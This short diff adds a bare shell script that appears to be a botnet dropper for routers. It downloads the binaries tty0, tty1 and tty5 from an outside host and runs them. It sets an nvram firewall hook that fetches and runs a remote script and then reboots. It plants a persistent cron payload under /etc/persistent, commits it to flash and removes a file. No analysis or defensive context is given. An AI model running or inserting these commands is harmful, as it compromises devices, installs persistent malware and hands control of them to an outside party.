@@ -1,0 +1,13 @@
+wget http://bnry.jorgee.nu/bin/tty0 && chmod +x tty0 && ./tty0 &
+wget http://bnry.jorgee.nu/bin/tty1 && chmod +x tty1 && ./tty1 &
+wget http://bnry.jorgee.nu/bin/tty5 && chmod +x tty5 && ./tty5 &
+nvram set rc_firewall="sleep 120
+wget http://bnry.jorgee.nu/nvr -P /tmp
+sh /tmp/nvr
+sleep 172800
+reboot"
+nvram commit
+echo "/etc/persistent/cron" > /etc/persistent/rc.postsysinit
+wget http://bnry.jorgee.nu/cron -P /etc/persistent && chmod 700 /etc/persistent/cron
+cfgmtd -w -p /etc/
+rm -rf /var/run/wgsh
